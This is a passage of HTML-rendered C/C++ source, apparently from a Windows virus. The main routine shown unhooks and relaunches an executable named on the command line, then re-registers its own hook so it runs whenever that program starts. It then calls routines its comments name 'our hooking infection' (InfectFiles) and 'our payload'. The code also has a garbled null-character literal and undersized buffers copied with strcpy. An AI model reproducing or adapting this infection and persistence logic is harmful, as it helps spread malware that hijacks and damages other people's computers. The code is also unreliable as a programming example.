</span><span class="sc0">    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc2">//cat the key and the appname
</span><span class="sc0">    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">,</span><span class="sc11">appName</span><span class="sc10">);</span><span class="sc0">
    
        </span><span class="sc2">//check for command line arguments to the exe
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">lpCmdLine</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//remove the hook if one exists
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">HookExists</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">UnHook</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//start parsing through the paths given
</span><span class="sc0">            </span><span class="sc2">//in the cmdline
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lpCmdLine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'�'</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'"'</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'*'</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">p</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc6">"*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc6">".EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".EXE$ "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">ap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ag</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">split</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc6">"$"</span><span class="sc10">,</span><span class="sc11">ap</span><span class="sc10">,</span><span class="sc11">ag</span><span class="sc10">);</span><span class="sc0">
        
            </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">u</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">ap</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()];</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">u</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ap</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
            
            </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">ag</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()];</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ag</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
            
            </span><span class="sc2">//now we should have the exe and the arguments
</span><span class="sc0">            </span><span class="sc2">//we can create a new process and launch it
</span><span class="sc0">            </span><span class="sc2">//since the previous hook was removed we can
</span><span class="sc0">            </span><span class="sc2">//launch it, below we will rehook it again
</span><span class="sc0">            </span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">si</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">pi</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc11">ZeroMemory</span><span class="sc0"> </span><span class="sc10">(&amp;</span><span class="sc11">si</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">si</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">si</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">si</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc11">u</span><span class="sc10">,</span><span class="sc11">t</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">CREATE_NEW_PROCESS_GROUP</span><span class="sc10">|</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">si</span><span class="sc10">,&amp;</span><span class="sc11">pi</span><span class="sc10">))</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">//if we created the process resume and wait 
</span><span class="sc0">                </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc2">//we rehook although it maybe hooked already
</span><span class="sc0">    </span><span class="sc2">//there isn't any harm in overwriting it
</span><span class="sc0">    </span><span class="sc2">//plus if the above code was executed we will have
</span><span class="sc0">    </span><span class="sc2">//to rehook anyways
</span><span class="sc0">    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Hook</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">))</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//call our hooking infection
</span><span class="sc0">        </span><span class="sc11">InfectFiles</span><span class="sc10">();</span><span class="sc0">
       
        </span><span class="sc2">//run our payload
</span><span class="sc0">    </span><span class="sc11">Payload</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc2">//exit
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
